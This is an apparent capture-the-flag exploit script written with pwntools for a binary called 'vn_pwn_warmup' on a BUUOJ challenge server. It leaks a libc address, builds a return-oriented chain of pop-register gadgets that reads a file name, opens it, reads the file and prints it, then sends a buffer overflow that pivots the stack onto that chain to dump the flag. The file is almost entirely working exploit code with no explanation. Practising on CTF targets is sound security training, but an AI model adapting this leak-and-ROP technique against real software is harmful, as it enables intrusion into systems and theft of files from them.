#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_warmup'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 29101

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	li(rl())
	ru('0x')
	puts = int(r(12), 16)
	lib.address = puts - lib.sym['puts']

	li('libc_base ' + hex(lib.address))
	ru('something:')
	'''
	read:
	RDI  0x0
	RSI  0x7fffffffeb30 ◂— 0x6562b026
	RDX  0x80
	'''
	pop_rsi = lib.address + 0x00000000000202e8
	pop_rdi = lib.address + 0x0000000000021102
	pop_rdx = lib.address + 0x0000000000001b92
	null = lib.address + 0x7ffff7dd3000 - 0x7ffff7a0d000

	# read input file name as flag
	p = p64(pop_rdi) + p64(0x0)   # fd
	p += p64(pop_rsi) + p64(null) # buf
	p += p64(pop_rdx) + p64(0x10) # length
	p += p64(lib.sym['read'])

	# open
	p += p64(pop_rsi) + p64(0x0)  # arg
	p += p64(pop_rdx) + p64(0x0)  # arg 2
	p += p64(pop_rdi) + p64(null) # file name
	p += p64(lib.sym['open'])

	# read input file name as flag
	p += p64(pop_rdi) + p64(0x3)  # fd
	p += p64(pop_rsi) + p64(null) # buf
	p += p64(pop_rdx) + p64(0x80) # length
	p += p64(lib.sym['read'])

	# puts
	p += p64(pop_rdi) + p64(null)
	p += p64(lib.sym['puts'])
	
	s(p)
	ru('name?')

	ret = 0x0000000000000937 + lib.address
	p = '\x00' * 0x70
	p += p64(null + 0x18)
	p += p64(ret)

	s(p)
	#db()
	s('flag\x00')
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
